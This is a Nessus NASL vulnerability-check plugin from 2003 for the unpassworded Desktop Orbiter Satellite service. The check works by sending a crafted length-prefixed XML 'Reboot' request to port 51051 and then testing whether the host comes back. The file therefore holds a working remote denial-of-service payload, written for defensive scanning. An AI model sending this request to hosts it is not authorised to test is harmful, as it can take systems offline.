#
# (C) Tenable Network Security
#

if(description)
{
 script_id(11713);
 script_version ("$Revision: 1.3 $");
 name["english"] = "Desktop Orbiter Remote Reboot";
 script_name(english:name["english"]);

 
 desc["english"] = "
The remote host is running a Desktop Orbiter Satellite

As this service is unpassworded, an attacker may connect to
it to reboot the remote host or take administrative control
over it.

Solution : Disable this service
Risk factor : High";




  script_description(english:desc["english"]);


   summary["english"] = "Reboots the remote host using Desktop Orbiter";
   script_summary(english:summary["english"]);


 script_category(ACT_KILL_HOST);

 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");

 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencie( "find_service.nes", "desktop_orbiter_detect.nasl");
 script_require_ports("Services/desktop-orbiter", 51051);
 exit(0);
}

include("misc_func.inc");

port = get_kb_item("Services/desktop-orbiter");
if(!port)port = 51051;
if(!get_port_state(port))exit(0);

req = '<?xml version = "1.0"?>\r
\r
<Request version = "1.0" timestamp = "6/3/2003 10:52:11 AM">\r
   <param id = "_ActionId" value = "SIMPLEACTION" type = "string"/>\r
   <param id = "command" value = "Reboot" type = "string"/>\r
</Request>';


start_denial();
soc = open_sock_tcp(port);
if(!soc)exit(0);

send(socket:soc, data:raw_string(strlen(req) % 256, strlen(req) / 256, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00));
r = recv(socket:soc, length:8);
if(strlen(r) != 8 )exit(0);
len = ord(r[0]);
r = recv(socket:soc, length:len);
if("Reply version" >< r) {
 	sleep(20);
	alive = end_denial();
	if( ! alive ) security_hole(port);
	}
